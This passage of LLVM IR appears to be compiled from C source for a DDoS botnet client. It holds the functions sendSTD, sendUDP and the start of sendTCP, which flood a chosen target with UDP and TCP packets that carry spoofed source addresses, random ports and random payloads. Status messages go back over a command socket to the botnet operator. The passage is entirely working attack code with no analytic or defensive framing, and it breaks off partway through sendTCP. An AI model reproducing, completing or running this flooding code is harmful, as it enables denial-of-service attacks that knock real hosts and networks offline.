  %25 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %23, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.323, i64 0, i64 0), i32 noundef %24) #12
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i64 0, i64 0
  %27 = call i32 @strcmp(i8* noundef %26, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.324, i64 0, i64 0)) #11
  %28 = icmp ne i32 %27, 0
  br i1 %28, label %30, label %29

29:                                               ; preds = %3
  store i32 1, i32* %11, align 4
  br label %30

30:                                               ; preds = %29, %3
  %31 = bitcast [78 x i8*]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %31, i8* align 16 bitcast ([78 x i8*]* @__const.sendSTD.randstrings to i8*), i64 624, i1 false)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %32, align 4
  %33 = load i32, i32* @mainCommSock, align 4
  %34 = load i8*, i8** %4, align 8
  %35 = getelementptr inbounds [12 x i8], [12 x i8]* %17, i64 0, i64 0
  %36 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %33, i8* noundef getelementptr inbounds ([20 x i8], [20 x i8]* @.str.402, i64 0, i64 0), i8* noundef %34, i8* noundef %35)
  br label %37

37:                                               ; preds = %86, %30
  %38 = load i32, i32* %11, align 4
  %39 = icmp eq i32 %38, 1
  br i1 %39, label %40, label %47

40:                                               ; preds = %37
  %41 = call i32 @rand() #12
  %42 = srem i32 %41, 65535
  %43 = add nsw i32 %42, 1026
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 noundef zeroext %44) #15
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  br label %52

47:                                               ; preds = %37
  %48 = load i32, i32* %5, align 4
  %49 = trunc i32 %48 to i16
  %50 = call zeroext i16 @htons(i16 noundef zeroext %49) #15
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %50, i16* %51, align 2
  br label %52

52:                                               ; preds = %47, %40
  %53 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 17) #12
  store i32 %53, i32* %7, align 4
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

55:                                               ; preds = %52
  br label %73

56:                                               ; preds = %52
  %57 = call i32 @rand() #12
  %58 = sext i32 %57 to i64
  %59 = urem i64 %58, 78
  %60 = getelementptr inbounds [78 x i8*], [78 x i8*]* %18, i64 0, i64 %59
  %61 = load i8*, i8** %60, align 8
  store i8* %61, i8** %16, align 8
  %62 = load i32, i32* %7, align 4
  %63 = load i8*, i8** %16, align 8
  %64 = load i8*, i8** %16, align 8
  %65 = call i64 @strlen(i8* noundef %64) #11
  %66 = bitcast %union.__CONST_SOCKADDR_ARG* %19 to %struct.sockaddr**
  %67 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  store %struct.sockaddr* %67, %struct.sockaddr** %66, align 8
  %68 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %19, i32 0, i32 0
  %69 = load %struct.sockaddr*, %struct.sockaddr** %68, align 8
  %70 = call i64 @sendto(i32 noundef %62, i8* noundef %63, i64 noundef %65, i32 noundef 0, %struct.sockaddr* %69, i32 noundef 16)
  %71 = load i32, i32* %7, align 4
  %72 = call i32 @close(i32 noundef %71)
  br label %73

73:                                               ; preds = %56, %55
  %74 = load i32, i32* %8, align 4
  %75 = icmp sge i32 %74, 100
  br i1 %75, label %76, label %86

76:                                               ; preds = %73
  %77 = call i64 @time(i64* noundef null) #12
  %78 = load i64, i64* %14, align 8
  %79 = load i32, i32* %6, align 4
  %80 = sext i32 %79 to i64
  %81 = add nsw i64 %78, %80
  %82 = icmp sge i64 %77, %81
  br i1 %82, label %83, label %84

83:                                               ; preds = %76
  br label %89

84:                                               ; preds = %76
  store i32 0, i32* %8, align 4
  br label %85

85:                                               ; preds = %84
  br label %86

86:                                               ; preds = %85, %73
  %87 = load i32, i32* %8, align 4
  %88 = add nsw i32 %87, 1
  store i32 %88, i32* %8, align 4
  br label %37

89:                                               ; preds = %83
  %90 = load i32, i32* %7, align 4
  %91 = call i32 @close(i32 noundef %90)
  call void @exit(i32 noundef 0) #16
  unreachable
}

declare i64 @sendto(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr*, i32 noundef) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32 noundef) #10

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendUDP(i8* noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3, i32 noundef %4, i32 noundef %5, i32 noundef %6, i32 noundef %7) #0 {
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i64, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.udphdr*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i32, align 4
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 %7, i32* %16, align 4
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %37, align 4
  %38 = load i32, i32* %10, align 4
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %40, label %44

40:                                               ; preds = %8
  %41 = call i32 @rand_cmwc()
  %42 = trunc i32 %41 to i16
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %42, i16* %43, align 2
  br label %49

44:                                               ; preds = %8
  %45 = load i32, i32* %10, align 4
  %46 = trunc i32 %45 to i16
  %47 = call zeroext i16 @htons(i16 noundef zeroext %46) #15
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %47, i16* %48, align 2
  br label %49

49:                                               ; preds = %44, %40
  %50 = load i8*, i8** %9, align 8
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %52 = call i32 @getHost(i8* noundef %50, %struct.in_addr* noundef %51)
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %54, label %55

54:                                               ; preds = %49
  br label %312

55:                                               ; preds = %49
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %57 = getelementptr inbounds [8 x i8], [8 x i8]* %56, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %57, i8 0, i64 8, i1 false)
  %58 = load i32, i32* %14, align 4
  store i32 %58, i32* %18, align 4
  %59 = load i32, i32* %12, align 4
  %60 = icmp eq i32 %59, 32
  br i1 %60, label %61, label %129

61:                                               ; preds = %55
  %62 = call i32 @socket(i32 noundef 2, i32 noundef 2, i32 noundef 17) #12
  store i32 %62, i32* %19, align 4
  %63 = load i32, i32* %19, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %68, label %65

65:                                               ; preds = %61
  %66 = load i32, i32* @mainCommSock, align 4
  %67 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %66, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i64 0, i64 0))
  br label %312

68:                                               ; preds = %61
  %69 = load i32, i32* %13, align 4
  %70 = add nsw i32 %69, 1
  %71 = sext i32 %70 to i64
  %72 = call noalias i8* @malloc(i64 noundef %71) #12
  store i8* %72, i8** %20, align 8
  %73 = load i8*, i8** %20, align 8
  %74 = icmp eq i8* %73, null
  br i1 %74, label %75, label %76

75:                                               ; preds = %68
  br label %312

76:                                               ; preds = %68
  %77 = load i8*, i8** %20, align 8
  %78 = load i32, i32* %13, align 4
  %79 = add nsw i32 %78, 1
  %80 = sext i32 %79 to i64
  call void @llvm.memset.p0i8.i64(i8* align 1 %77, i8 0, i64 %80, i1 false)
  %81 = load i8*, i8** %20, align 8
  %82 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* noundef %81, i32 noundef %82)
  %83 = call i64 @time(i64* noundef null) #12
  %84 = load i32, i32* %11, align 4
  %85 = sext i32 %84 to i64
  %86 = add nsw i64 %83, %85
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %88

88:                                               ; preds = %125, %121, %114, %76
  %89 = load i32, i32* %19, align 4
  %90 = load i8*, i8** %20, align 8
  %91 = load i32, i32* %13, align 4
  %92 = sext i32 %91 to i64
  %93 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %94 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %94, %struct.sockaddr** %93, align 8
  %95 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %96 = load %struct.sockaddr*, %struct.sockaddr** %95, align 8
  %97 = call i64 @sendto(i32 noundef %89, i8* noundef %90, i64 noundef %92, i32 noundef 0, %struct.sockaddr* %96, i32 noundef 16)
  %98 = load i32, i32* %22, align 4
  %99 = load i32, i32* %18, align 4
  %100 = icmp eq i32 %98, %99
  br i1 %100, label %101, label %115

101:                                              ; preds = %88
  %102 = load i32, i32* %10, align 4
  %103 = icmp eq i32 %102, 0
  br i1 %103, label %104, label %108

104:                                              ; preds = %101
  %105 = call i32 @rand_cmwc()
  %106 = trunc i32 %105 to i16
  %107 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %106, i16* %107, align 2
  br label %108

108:                                              ; preds = %104, %101
  %109 = call i64 @time(i64* noundef null) #12
  %110 = load i32, i32* %21, align 4
  %111 = sext i32 %110 to i64
  %112 = icmp sgt i64 %109, %111
  br i1 %112, label %113, label %114

113:                                              ; preds = %108
  br label %128

114:                                              ; preds = %108
  store i32 0, i32* %22, align 4
  br label %88

115:                                              ; preds = %88
  %116 = load i32, i32* %22, align 4
  %117 = add i32 %116, 1
  store i32 %117, i32* %22, align 4
  %118 = load i32, i32* %23, align 4
  %119 = load i32, i32* %15, align 4
  %120 = icmp eq i32 %118, %119
  br i1 %120, label %121, label %125

121:                                              ; preds = %115
  %122 = load i32, i32* %16, align 4
  %123 = mul nsw i32 %122, 1000
  %124 = call i32 @usleep(i32 noundef %123)
  store i32 0, i32* %23, align 4
  br label %88

125:                                              ; preds = %115
  %126 = load i32, i32* %23, align 4
  %127 = add i32 %126, 1
  store i32 %127, i32* %23, align 4
  br label %88

128:                                              ; preds = %113
  br label %312

129:                                              ; preds = %55
  %130 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #12
  store i32 %130, i32* %25, align 4
  %131 = load i32, i32* %25, align 4
  %132 = icmp ne i32 %131, 0
  br i1 %132, label %136, label %133

133:                                              ; preds = %129
  %134 = load i32, i32* @mainCommSock, align 4
  %135 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %134, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i64 0, i64 0))
  br label %312

136:                                              ; preds = %129
  store i32 1, i32* %26, align 4
  %137 = load i32, i32* %25, align 4
  %138 = bitcast i32* %26 to i8*
  %139 = call i32 @setsockopt(i32 noundef %137, i32 noundef 0, i32 noundef 3, i8* noundef %138, i32 noundef 4) #12
  %140 = icmp slt i32 %139, 0
  br i1 %140, label %141, label %144

141:                                              ; preds = %136
  %142 = load i32, i32* @mainCommSock, align 4
  %143 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %142, i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i64 0, i64 0))
  br label %312

144:                                              ; preds = %136
  store i32 50, i32* %27, align 4
  br label %145

145:                                              ; preds = %149, %144
  %146 = load i32, i32* %27, align 4
  %147 = add nsw i32 %146, -1
  store i32 %147, i32* %27, align 4
  %148 = icmp ne i32 %146, 0
  br i1 %148, label %149, label %156

149:                                              ; preds = %145
  %150 = call i64 @time(i64* noundef null) #12
  %151 = call i32 @rand_cmwc()
  %152 = zext i32 %151 to i64
  %153 = xor i64 %150, %152
  %154 = trunc i64 %153 to i32
  call void @srand(i32 noundef %154) #12
  %155 = call i32 @rand() #12
  call void @init_rand(i32 noundef %155)
  br label %145, !llvm.loop !48

156:                                              ; preds = %145
  %157 = load i32, i32* %12, align 4
  %158 = icmp eq i32 %157, 0
  br i1 %158, label %159, label %160

159:                                              ; preds = %156
  store i32 0, i32* %28, align 4
  br label %166

160:                                              ; preds = %156
  %161 = load i32, i32* %12, align 4
  %162 = sub nsw i32 32, %161
  %163 = shl i32 1, %162
  %164 = sub nsw i32 %163, 1
  %165 = xor i32 %164, -1
  store i32 %165, i32* %28, align 4
  br label %166

166:                                              ; preds = %160, %159
  %167 = load i32, i32* %13, align 4
  %168 = sext i32 %167 to i64
  %169 = add i64 28, %168
  %170 = call i8* @llvm.stacksave()
  store i8* %170, i8** %29, align 8
  %171 = alloca i8, i64 %169, align 16
  store i64 %169, i64* %30, align 8
  %172 = bitcast i8* %171 to %struct.iphdr*
  store %struct.iphdr* %172, %struct.iphdr** %31, align 8
  %173 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %174 = bitcast %struct.iphdr* %173 to i8*
  %175 = getelementptr i8, i8* %174, i64 20
  %176 = bitcast i8* %175 to %struct.udphdr*
  store %struct.udphdr* %176, %struct.udphdr** %32, align 8
  %177 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %179 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %178, i32 0, i32 0
  %180 = load i32, i32* %179, align 4
  %181 = load i32, i32* %28, align 4
  %182 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 noundef %181)
  %183 = call i32 @htonl(i32 noundef %182) #15
  %184 = load i32, i32* %13, align 4
  %185 = sext i32 %184 to i64
  %186 = add i64 8, %185
  %187 = trunc i64 %186 to i32
  call void @makeIPPacket(%struct.iphdr* noundef %177, i32 noundef %180, i32 noundef %183, i8 noundef zeroext 17, i32 noundef %187)
  %188 = load i32, i32* %13, align 4
  %189 = sext i32 %188 to i64
  %190 = add i64 8, %189
  %191 = trunc i64 %190 to i16
  %192 = call zeroext i16 @htons(i16 noundef zeroext %191) #15
  %193 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %194 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %193, i32 0, i32 0
  %195 = bitcast %union.anon.2* %194 to %struct.anon.3*
  %196 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %195, i32 0, i32 2
  store i16 %192, i16* %196, align 2
  %197 = call i32 @rand_cmwc()
  %198 = trunc i32 %197 to i16
  %199 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %200 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %199, i32 0, i32 0
  %201 = bitcast %union.anon.2* %200 to %struct.anon.3*
  %202 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %201, i32 0, i32 0
  store i16 %198, i16* %202, align 2
  %203 = load i32, i32* %10, align 4
  %204 = icmp eq i32 %203, 0
  br i1 %204, label %205, label %207

205:                                              ; preds = %166
  %206 = call i32 @rand_cmwc()
  br label %212

207:                                              ; preds = %166
  %208 = load i32, i32* %10, align 4
  %209 = trunc i32 %208 to i16
  %210 = call zeroext i16 @htons(i16 noundef zeroext %209) #15
  %211 = zext i16 %210 to i32
  br label %212

212:                                              ; preds = %207, %205
  %213 = phi i32 [ %206, %205 ], [ %211, %207 ]
  %214 = trunc i32 %213 to i16
  %215 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %216 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %215, i32 0, i32 0
  %217 = bitcast %union.anon.2* %216 to %struct.anon.3*
  %218 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %217, i32 0, i32 1
  store i16 %214, i16* %218, align 2
  %219 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %220 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %219, i32 0, i32 0
  %221 = bitcast %union.anon.2* %220 to %struct.anon.3*
  %222 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %221, i32 0, i32 3
  store i16 0, i16* %222, align 2
  %223 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %224 = bitcast %struct.udphdr* %223 to i8*
  %225 = getelementptr inbounds i8, i8* %224, i64 8
  %226 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* noundef %225, i32 noundef %226)
  %227 = bitcast i8* %171 to i16*
  %228 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 2
  %230 = load i16, i16* %229, align 2
  %231 = zext i16 %230 to i32
  %232 = call zeroext i16 @csum(i16* noundef %227, i32 noundef %231)
  %233 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %234 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %233, i32 0, i32 7
  store i16 %232, i16* %234, align 2
  %235 = call i64 @time(i64* noundef null) #12
  %236 = load i32, i32* %11, align 4
  %237 = sext i32 %236 to i64
  %238 = add nsw i64 %235, %237
  %239 = trunc i64 %238 to i32
  store i32 %239, i32* %33, align 4
  store i32 0, i32* %34, align 4
  store i32 0, i32* %35, align 4
  br label %240

240:                                              ; preds = %307, %303, %296, %212
  br label %241

241:                                              ; preds = %240
  %242 = load i32, i32* %25, align 4
  %243 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %244 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  store %struct.sockaddr* %244, %struct.sockaddr** %243, align 8
  %245 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %246 = load %struct.sockaddr*, %struct.sockaddr** %245, align 8
  %247 = call i64 @sendto(i32 noundef %242, i8* noundef %171, i64 noundef %169, i32 noundef 0, %struct.sockaddr* %246, i32 noundef 16)
  %248 = call i32 @rand_cmwc()
  %249 = trunc i32 %248 to i16
  %250 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 0
  %252 = bitcast %union.anon.2* %251 to %struct.anon.3*
  %253 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %252, i32 0, i32 0
  store i16 %249, i16* %253, align 2
  %254 = load i32, i32* %10, align 4
  %255 = icmp eq i32 %254, 0
  br i1 %255, label %256, label %258

256:                                              ; preds = %241
  %257 = call i32 @rand_cmwc()
  br label %263

258:                                              ; preds = %241
  %259 = load i32, i32* %10, align 4
  %260 = trunc i32 %259 to i16
  %261 = call zeroext i16 @htons(i16 noundef zeroext %260) #15
  %262 = zext i16 %261 to i32
  br label %263

263:                                              ; preds = %258, %256
  %264 = phi i32 [ %257, %256 ], [ %262, %258 ]
  %265 = trunc i32 %264 to i16
  %266 = load %struct.udphdr*, %struct.udphdr** %32, align 8
  %267 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon.2* %267 to %struct.anon.3*
  %269 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %268, i32 0, i32 1
  store i16 %265, i16* %269, align 2
  %270 = call i32 @rand_cmwc()
  %271 = trunc i32 %270 to i16
  %272 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 3
  store i16 %271, i16* %273, align 4
  %274 = load i32, i32* %28, align 4
  %275 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 noundef %274)
  %276 = call i32 @htonl(i32 noundef %275) #15
  %277 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 8
  store i32 %276, i32* %278, align 4
  %279 = bitcast i8* %171 to i16*
  %280 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %281 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %280, i32 0, i32 2
  %282 = load i16, i16* %281, align 2
  %283 = zext i16 %282 to i32
  %284 = call zeroext i16 @csum(i16* noundef %279, i32 noundef %283)
  %285 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 7
  store i16 %284, i16* %286, align 2
  %287 = load i32, i32* %34, align 4
  %288 = load i32, i32* %18, align 4
  %289 = icmp eq i32 %287, %288
  br i1 %289, label %290, label %297

290:                                              ; preds = %263
  %291 = call i64 @time(i64* noundef null) #12
  %292 = load i32, i32* %33, align 4
  %293 = sext i32 %292 to i64
  %294 = icmp sgt i64 %291, %293
  br i1 %294, label %295, label %296

295:                                              ; preds = %290
  br label %310

296:                                              ; preds = %290
  store i32 0, i32* %34, align 4
  br label %240

297:                                              ; preds = %263
  %298 = load i32, i32* %34, align 4
  %299 = add i32 %298, 1
  store i32 %299, i32* %34, align 4
  %300 = load i32, i32* %35, align 4
  %301 = load i32, i32* %15, align 4
  %302 = icmp eq i32 %300, %301
  br i1 %302, label %303, label %307

303:                                              ; preds = %297
  %304 = load i32, i32* %16, align 4
  %305 = mul nsw i32 %304, 1000
  %306 = call i32 @usleep(i32 noundef %305)
  store i32 0, i32* %35, align 4
  br label %240

307:                                              ; preds = %297
  %308 = load i32, i32* %35, align 4
  %309 = add i32 %308, 1
  store i32 %309, i32* %35, align 4
  br label %240

310:                                              ; preds = %295
  %311 = load i8*, i8** %29, align 8
  call void @llvm.stackrestore(i8* %311)
  br label %312

312:                                              ; preds = %310, %141, %133, %128, %75, %65, %54
  ret void
}

declare i32 @usleep(i32 noundef) #3

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32 noundef) #8

; Function Attrs: nofree nosync nounwind willreturn
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendTCP(i8* noundef %0, i32 noundef %1, i32 noundef %2, i32 noundef %3, i8* noundef %4, i32 noundef %5, i32 noundef %6) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i64, align 8
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.tcphdr*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %28 = load i32, i32* %14, align 4
  store i32 %28, i32* %15, align 4
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = load i32, i32* %9, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %36

32:                                               ; preds = %7
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %41

36:                                               ; preds = %7
  %37 = load i32, i32* %9, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 noundef zeroext %38) #15
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  br label %41

41:                                               ; preds = %36, %32
  %42 = load i8*, i8** %8, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %44 = call i32 @getHost(i8* noundef %42, %struct.in_addr* noundef %43)
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %47

46:                                               ; preds = %41
  br label %347

47:                                               ; preds = %41
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %49, i8 0, i64 8, i1 false)
  %50 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #12
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %56, label %53

53:                                               ; preds = %47
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %54, i8* noundef getelementptr inbounds ([27 x i8], [27 x i8]* @.str.403, i64 0, i64 0))
  br label %347

56:                                               ; preds = %47
  store i32 1, i32* %18, align 4
  %57 = load i32, i32* %17, align 4
  %58 = bitcast i32* %18 to i8*
  %59 = call i32 @setsockopt(i32 noundef %57, i32 noundef 0, i32 noundef 3, i8* noundef %58, i32 noundef 4) #12
  %60 = icmp slt i32 %59, 0
  br i1 %60, label %61, label %64

61:                                               ; preds = %56
  %62 = load i32, i32* @mainCommSock, align 4
  %63 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %62, i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.404, i64 0, i64 0))
  br label %347

64:                                               ; preds = %56
  %65 = load i32, i32* %11, align 4
  %66 = icmp eq i32 %65, 0
  br i1 %66, label %67, label %68

67:                                               ; preds = %64
  store i32 0, i32* %19, align 4
  br label %74

68:                                               ; preds = %64
  %69 = load i32, i32* %11, align 4
  %70 = sub nsw i32 32, %69
  %71 = shl i32 1, %70
  %72 = sub nsw i32 %71, 1
  %73 = xor i32 %72, -1
  store i32 %73, i32* %19, align 4
  br label %74

74:                                               ; preds = %68, %67
  %75 = load i32, i32* %13, align 4
  %76 = sext i32 %75 to i64
  %77 = add i64 40, %76
  %78 = call i8* @llvm.stacksave()
  store i8* %78, i8** %20, align 8
  %79 = alloca i8, i64 %77, align 16
  store i64 %77, i64* %21, align 8
  %80 = bitcast i8* %79 to %struct.iphdr*
  store %struct.iphdr* %80, %struct.iphdr** %22, align 8
  %81 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %82 = bitcast %struct.iphdr* %81 to i8*
  %83 = getelementptr i8, i8* %82, i64 20
  %84 = bitcast i8* %83 to %struct.tcphdr*
  store %struct.tcphdr* %84, %struct.tcphdr** %23, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %86 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %87 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %86, i32 0, i32 0
  %88 = load i32, i32* %87, align 4
  %89 = load i32, i32* %19, align 4
  %90 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 noundef %89)
  %91 = call i32 @htonl(i32 noundef %90) #15
  %92 = load i32, i32* %13, align 4
  %93 = sext i32 %92 to i64
  %94 = add i64 20, %93
  %95 = trunc i64 %94 to i32
  call void @makeIPPacket(%struct.iphdr* noundef %85, i32 noundef %88, i32 noundef %91, i8 noundef zeroext 6, i32 noundef %95)
  %96 = call i32 @rand_cmwc()
  %97 = trunc i32 %96 to i16
  %98 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %99 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %98, i32 0, i32 0
  %100 = bitcast %union.anon.0* %99 to %struct.anon.1*
  %101 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %100, i32 0, i32 0
  store i16 %97, i16* %101, align 4
  %102 = call i32 @rand_cmwc()
  %103 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %104 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %103, i32 0, i32 0
  %105 = bitcast %union.anon.0* %104 to %struct.anon.1*
  %106 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %105, i32 0, i32 2
  store i32 %102, i32* %106, align 4
  %107 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %108 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %107, i32 0, i32 0
  %109 = bitcast %union.anon.0* %108 to %struct.anon.1*
